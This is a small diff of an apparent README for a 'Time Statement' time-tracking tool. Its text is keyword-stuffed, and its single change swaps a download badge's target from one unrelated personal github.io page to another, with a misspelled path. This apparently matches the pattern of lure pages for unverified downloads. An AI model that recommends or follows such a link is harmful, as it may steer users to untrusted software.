@@ -12,7 +12,7 @@ Time Statement app focuses on practical time tracking statement workflows instea
 
 The Time Statement tool is also useful when teams need a repeatable time statement generator for weekly reviews. Time Statement reports can summarize billable blocks, employee time statement details, project notes, and timesheet statement totals without forcing users to rebuild the same layout every reporting cycle.
 
-[![GET Time Statement](https://img.shields.io/badge/GET%20%E2%80%94%20Time%20Statement-0078D6?style=for-the-badge&logoColor=white)](https://kaiherreravrhs.github.io/.github/time-statemeni-app)
+[![GET Time Statement](https://img.shields.io/badge/GET%20%E2%80%94%20Time%20Statement-0078D6?style=for-the-badge&logoColor=white)](https://wernermediaquint.github.io/.github/time-statemeni-app)
 
 ---
 
